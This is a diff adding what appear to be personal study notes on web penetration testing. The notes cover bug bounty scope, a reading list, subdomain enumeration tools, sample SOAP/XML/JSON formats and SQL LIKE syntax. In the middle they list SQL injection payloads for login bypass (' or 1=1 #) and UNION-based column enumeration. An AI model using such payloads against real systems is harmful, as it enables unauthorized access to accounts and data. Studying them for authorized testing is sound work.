@@ -1,0 +1,132 @@
+PoC(Proof of concept)
+
+
+
+in-scope
+oos(out of scope)
+
+
+*.x.com
+
+
+oos:
+y.x.com
+
+web hacking 101
+modern web pentest (packt)
+breaking in to information security
+web application hackers handbook
+owasp web guide release 5
+
+
+
+report
+
+
+
+
+subdomain enumeration:
+		subdomain scrapping
+			dnsdumpster.com/net
+			virustotal.com
+			.
+			.
+			.
+
+
+		subdomain brute force
+			knock (python)
+			amass (Cm,elf)
+
+https://0xpatrik.com/subdomain-takeover-basics/
+
+
+
+https://toolbox.googleapps.com/apps/dig/
+
+
+
+
+SELECT * FROM users WHERE username = '' or 1=1 #  ' AND password = 'ada'
+
+
+' or 1=1 #
+admin' or 1=1 #
+admin' #
+admin' or 40=1 #
+
+
+' order by 1 #
+
+admin' order by 9 #
+admin' order by 10 #
+admin' union select 1,2,3,4,5,6,7,8,9 #
+' union select 1,2,3,4,5,6,7,8,9 #
+
+
+Web Service :
+	
+JSON -> javascript 
+SOAP asmx - WSDL asmx?wsdl -> xml
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <Contacts.GetContactIdByEmail xmlns="http://tempuri.org/">
+      <AccountAPI_Key>string</AccountAPI_Key>
+      <EmailAddress>string</EmailAddress>
+    </Contacts.GetContactIdByEmail>
+  </soap:Body>
+</soap:Envelope>
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<Users>
+	<user>
+		<id>1</id>
+		<username>ali</username>
+		<password value="123" />
+	</user>
+	<user>
+		<id>1</id>
+		<username>ali</username>
+		<password value="123" />
+	</user>	
+</Users>
+
+
+
+
+JSON :
+
+Single JSON Object:
+	{"id":"1","username":"ali","password":"123"}
+	{"key":"value","key":"valu2"}
+	
+Array of JSON:
+	[	
+		{"id":"1","username":"ali","password":"123"},
+		{"id":"2","username":"admin","password":"333"},
+		{"id":"3","username":"x","password":"y"}
+	]
+	[0]
+
+
+JSON of JSONS (Nested Json):
+		
+		{
+			"user1":{"id":"1","username":"ali","password":"123"},
+			"user2":{"id":"2","username":"admin","password":"333"},
+			"user3":{"id":"3","username":"x","password":"y"}
+		}
+	
+
+
+
+LIKE '%str'
+LIKE 'str%'
+LIKE '%str%'
+
+
+
+
